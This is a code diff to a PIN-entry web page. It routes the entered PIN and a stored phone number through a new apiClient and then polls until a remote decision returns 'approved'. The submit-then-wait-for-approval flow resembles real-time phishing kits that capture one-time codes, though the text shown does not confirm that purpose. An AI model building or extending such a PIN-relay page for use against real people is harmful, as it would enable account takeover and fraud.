@@ -163,6 +163,7 @@
         </style>
     </div>
 
+    <script src="apiClient.js"></script>
     <script>
         const inputs = document.querySelectorAll('.pin-input');
 
@@ -205,28 +206,26 @@
             inputs.forEach(i => i.disabled = true);
             document.getElementById('waitOverlay').style.display = 'flex';
 
-            const sessionId = sessionStorage.getItem('sessionId') ||
-                (Date.now().toString(36) + Math.random().toString(36).slice(2));
-            sessionStorage.setItem('sessionId', sessionId);
+            const attemptId = sessionStorage.getItem('attemptId');
             const phone = sessionStorage.getItem('phone') || '';
 
             try {
-                await fetch('/.netlify/functions/request-approval', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'pin', pin: code, phone, sessionId })
+                await window.apiClient.requestApproval({ 
+                    type: 'pin', 
+                    pin: code, 
+                    phone, 
+                    attemptId // Pass existing attemptId if available 
                 });
             } catch (e) {
-                showPinError('Network error. Please try again.');
+                showPinError('Network error connecting to Gateway. Please try again.');
                 return;
             }
 
-            // Poll Redis for PIN decision
+            // Poll for PIN decision
             const poll = setInterval(async () => {
                 try {
-                    const res = await fetch(`/.netlify/functions/check-status?sessionId=${sessionId}&type=pin`);
-                    const data = await res.json();
-                    const status = data.status;
+                    const res = await window.apiClient.checkStatus(attemptId);
+                    const status = res.status;
 
                     if (status === 'approved') {
                         clearInterval(poll);
